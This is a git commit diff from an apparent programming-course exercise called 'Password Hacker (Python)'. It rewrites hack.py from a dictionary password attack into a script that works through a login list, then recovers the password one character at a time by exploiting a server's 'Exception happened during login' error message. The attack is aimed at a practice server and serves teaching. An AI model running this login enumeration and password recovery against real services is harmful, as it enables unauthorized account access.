71d8a4fbaa38b4657f33cdb70409c01482751d40
Alejandro RM <alejandror45@gmail.com>
2023-07-29 10:26:27 -0600

    Stage 4/5: Catching exception   The admin is really taking the case seriously. Now it is necessary to specify a valid login and password, and the password cannot be cracked by brute force. And yet, there is a vulnerability in the system that you can exploit to identify the admin's login and password.

--- Password Hacker (Python)/task/hacking/hack.py
+++ Password Hacker (Python)/task/hacking/hack.py
@@ -1,7 +1,9 @@
 import itertools
+import json
 import os
 import socket
 import sys
+from string import ascii_lowercase, ascii_uppercase, digits
 
 ip_address = sys.argv[1]
 port = int(sys.argv[2])
@@ -9,18 +11,34 @@ port = int(sys.argv[2])
 with socket.socket() as client_socket:
     address = (ip_address, port)
     client_socket.connect(address)
-
-    with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "passwords.txt"), "r") as file:
+    login = None
+    password = ""
+    with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "logins.txt"), "r") as file:
         for word in file:
-            word = word.strip()
-            product = itertools.product(*zip(word.upper(), word.lower()))
-            unique_combinations = set(''.join(item) for item in product)
-            for password in unique_combinations:
-                try:
-                    client_socket.send(password.encode('utf8'))
-                    response = client_socket.recv(1024).decode('utf8')
-                    if response == 'Connection success!':
-                        print(password)
-                        break
-                except:
-                    pass
+            login = word.strip()
+            data = {"login": login, "password": password}
+            client_socket.send(json.dumps(data).encode("utf-8"))
+            response = client_socket.recv(1024).decode('utf8')
+            response = json.loads(response)
+            if response["result"] == 'Wrong password!':
+                break
+
+    chars = list(''.join((ascii_lowercase, ascii_uppercase, digits)))
+    try:
+        for i in range(1, 11):
+            for letter in chars:
+                password_test = password + letter
+                data = {"login": login, "password": password_test}
+                client_socket.send(json.dumps(data).encode("utf-8"))
+                response = client_socket.recv(1024).decode('utf8')
+                response = json.loads(response)
+
+                if response["result"] == 'Connection success!':
+                    password = password_test
+                    break
+                elif response["result"] == 'Exception happened during login':
+                    password = password_test
+    except:
+        pass
+
+    print(json.dumps({"login": login, "password": password}, indent=4))
